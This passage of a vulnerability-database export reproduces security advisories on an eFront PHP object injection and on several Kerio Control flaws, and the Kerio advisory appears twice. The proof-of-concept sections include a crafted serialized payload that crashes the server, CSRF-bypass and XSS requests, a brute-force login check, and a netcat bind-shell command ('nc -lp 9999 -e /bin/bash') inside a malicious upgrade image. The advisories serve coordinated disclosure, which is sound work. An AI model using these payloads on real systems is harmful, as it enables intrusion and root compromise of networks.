\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \nInterested to work with the experts of SEC Consult?  \nSend us your application https://www.sec-consult.com/en/Career.htm  \n  \nInterested in improving your cyber security with the experts of SEC Consult?  \nContact our local offices https://www.sec-consult.com/en/About/Contact.htm  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nMail: research at sec-consult dot com  \nWeb: https://www.sec-consult.com  \nBlog: http://blog.sec-consult.com  \nTwitter: https://twitter.com/sec_consult  \n  \nEOF R. Freingruber / @2016  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:138812"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2015-05-09T00:00:00",
            "published": "2015-05-09T00:00:00",
            "href": "https://packetstormsecurity.com/files/131845/eFront-3.6.15-PHP-Object-Injection.html",
            "id": "PACKETSTORM:131845",
            "type": "packetstorm",
            "title": "eFront 3.6.15 PHP Object Injection",
            "sourceData": "`eFront 3.6.15 PHP Object Injection Vulnerability  \n  \n[+] Author: Filippo Roncari  \n[+] Target: eFront   \n[+] Version: 3.6.15 and probably lower  \n[+] Vendor: www.efrontlearning.net  \n[+] Accessibility: Remote  \n[+] Severity: High  \n[+] CVE: <requested>  \n[+] Full Advisory: https://www.securenetwork.it/docs/advisory/SN-15-02_eFront.pdf  \n[+] Info: f.roncari@securenetwork.it   \n  \n  \n[+] Summary  \neFront is an open source Learning Management System (LMS) used to create and manage online training courses. From Wikipedia: \u201ceFront is designed to assist with the creation of online learning communities while offering various opportunities for collaboration and interaction through an icon-based user interface. The platform offers tools for content creation, tests building, assignments management, reporting, internal messaging, forum, chat, surveys, calendar and others\u201d.   \n  \n  \n[+] Vulnerability Details  \neFront 3.6.15 is prone to a PHP Object Injection vulnerability due to the unsafe use of unserialize() function. A potential attacker, authenticated as a Professor, could exploit this vulnerability by sending specially crafted requests to the web application containing malicious serialized input.  \n  \n  \n[+] Technical Details  \nA PHP Object Injection issue affects the copy.php script, which handles the copying of content between lessons, and others probably exist, due to the frequent use of deserialization operations on non-sanitized user input.   \n  \n[!] File: libraries/includes/copy.php  \n-----------------------------  \nif ($_GET['transfered']) {  \n$transferedNodesCheck = unserialize($_GET['transfered']);   \n}  \n$copiedTests = array();  \n$copiedUnits = array();  \n$map = array();  \nforeach ($nodeOrders as $value) {  \nlist($id, $parentContentId) = explode(\"-\", $value);  \nif (!in_array($id, $transferedNodesCheck)) {  \n-----------------------------  \n  \nThe injection affects the \"transfered\" parameter.  \n  \n  \n[+] Proof of Concept (PoC)  \n  \n  \n[!] HTTP Request  \n-----------------------------  \nGET /test/efront/www/professor.php?ctg=copy&from=8&node_orders=&transfered=[SERIALIZED_ARBITRARY_OBJECT]&mode&a jax=ajax&csrf_id=6ebb0b3aee60a1764e780e8494985a8e HTTP/1.1  \nHost: localhost  \nProxy-Connection: keep-alive  \nAccept: text/javascript, text/html, application/xml, text/xml, */*  \nX-Prototype-Version: 1.7  \nX-Requested-With: XMLHttpRequest  \nCookie: display_all_courses=1; setFormRowsHidden=0; PHPSESSID=6ebb0b3aee60a1764e780e8494985a8e; SQLiteManager_currentLangue=2; PHPSESSID=6ebb0b3aee60a1764e780e8494985a8e; professor_sidebar=hidden; professor_sidebarMode=automatic; parent_sid=6ebb0b3aee60a1764e780e8494985a8e  \n-----------------------------  \n  \nA common way to exploit this vulnerability is to find a PHP magic method that can be abused and inject a properly crafted arbitrary object in order to trigger it. Although a deeper analysis has not been performed, no useful PHP magic methods have been identified in order to exploit this specific vulnerability. Because the unmarshalled user input $transferedNodesCheck is exclusively used within an in_array() call, only __wakeup() and __destruct() methods could be abused to exploit the issue. However, none of those lends itself to the purpose. The vulnerability could still be abused in case of PHP vulnerable version (e.g., CVE-2014-8142) to create denial of service, leak memory and, under certain conditions, execute code.  \n  \n  \n[+] Disclaimer  \nPermission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:131845"
        }
    ],
    "CVE-2015-0231": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-09-22T00:00:00",
            "published": "2016-09-22T00:00:00",
            "href": "https://packetstormsecurity.com/files/138812/Kerio-Control-Unified-Threat-Management-Code-Execution-XSS-Memory-Corruption.html",
            "id": "PACKETSTORM:138812",
            "type": "packetstorm",
            "title": "Kerio Control Unified Threat Management Code Execution / XSS / Memory Corruption",
            "sourceData": "`SEC Consult has also released a blog post describing the attack scenarios  \nof the vulnerabilities within this advisory in detail and a video which  \nshows the remote attack. Exploit code has been developed as well but will  \nnot be released for now.  \n  \nBlog:  \nhttp://blog.sec-consult.com/2016/09/controlling-kerio-control-when-your.html  \n  \nVideo:  \nhttps://www.youtube.com/watch?v=y_OWz25sHMI  \n  \n  \nSEC Consult Vulnerability Lab Security Advisory < 20160922-0 >  \n=======================================================================  \ntitle: Potential backdoor access through multiple vulnerabilities  \nproduct: Kerio Control Unified Threat Management  \nvulnerable version: <9.1.3, verified in version 9.1.0 build 1087 and 9.1.1  \nbuild 1324  \nfixed version: 9.1.3 (partially fixed, see vendor statement below)  \nCVE number: -  \nimpact: critical  \nhomepage: http://www.kerio.com/  \nfound: 2016-08-24  \nby: R. Freingruber (Office Vienna)  \nR. Tavakoli (Office Vienna)  \nSEC Consult Vulnerability Lab  \n  \nAn integrated part of SEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nhttps://www.sec-consult.com  \n  \n=======================================================================  \n  \nVendor description:  \n-------------------  \n\"Protect your network from viruses, malware and malicious activity  \nwith Kerio Control, the easy-to-administer yet powerful all-in-one  \nsecurity solution.  \nKerio Control brings together next-generation firewall capabilities -  \nincluding a network firewall and router, intrusion detection and  \nprevention (IPS), gateway anti-virus, VPN, and web contentand  \napplication filtering. These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It  \nensures the continued knowledge gain of SEC Consult in the field of network  \nand application security to stay ahead of the attacker. The SEC Consult  \nVulnerability Lab supports high-quality penetration testing and the evaluation  \nof new offensive and defensive technologies for our customers. Hence our  \ncustomers obtain the most current information about vulnerabilities and valid  \nrecommendation about the risk profile of new technologies.  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \nInterested to work with the experts of SEC Consult?  \nSend us your application https://www.sec-consult.com/en/Career.htm  \n  \nInterested in improving your cyber security with the experts of SEC Consult?  \nContact our local offices https://www.sec-consult.com/en/About/Contact.htm  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nMail: research at sec-consult dot com  \nWeb: https://www.sec-consult.com  \nBlog: http://blog.sec-consult.com  \nTwitter: https://twitter.com/sec_consult  \n  \nEOF R. Freingruber / @2016  \n  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:138812"
        }
    ],
    "CVE-2014-3515": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2016-09-22T00:00:00",
            "published": "2016-09-22T00:00:00",
            "href": "https://packetstormsecurity.com/files/138812/Kerio-Control-Unified-Threat-Management-Code-Execution-XSS-Memory-Corruption.html",
            "id": "PACKETSTORM:138812",
            "type": "packetstorm",
            "title": "Kerio Control Unified Threat Management Code Execution / XSS / Memory Corruption",
            "sourceData": "`SEC Consult has also released a blog post describing the attack scenarios  \nof the vulnerabilities within this advisory in detail and a video which  \nshows the remote attack. Exploit code has been developed as well but will  \nnot be released for now.  \n  \nBlog:  \nhttp://blog.sec-consult.com/2016/09/controlling-kerio-control-when-your.html  \n  \nVideo:  \nhttps://www.youtube.com/watch?v=y_OWz25sHMI  \n  \n  \nSEC Consult Vulnerability Lab Security Advisory < 20160922-0 >  \n=======================================================================  \ntitle: Potential backdoor access through multiple vulnerabilities  \nproduct: Kerio Control Unified Threat Management  \nvulnerable version: <9.1.3, verified in version 9.1.0 build 1087 and 9.1.1  \nbuild 1324  \nfixed version: 9.1.3 (partially fixed, see vendor statement below)  \nCVE number: -  \nimpact: critical  \nhomepage: http://www.kerio.com/  \nfound: 2016-08-24  \nby: R. Freingruber (Office Vienna)  \nR. Tavakoli (Office Vienna)  \nSEC Consult Vulnerability Lab  \n  \nAn integrated part of SEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nhttps://www.sec-consult.com  \n  \n=======================================================================  \n  \nVendor description:  \n-------------------  \n\"Protect your network from viruses, malware and malicious activity  \nwith Kerio Control, the easy-to-administer yet powerful all-in-one  \nsecurity solution.  \nKerio Control brings together next-generation firewall capabilities -  \nincluding a network firewall and router, intrusion detection and  \nprevention (IPS), gateway anti-virus, VPN, and web contentand  \napplication filtering. These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the 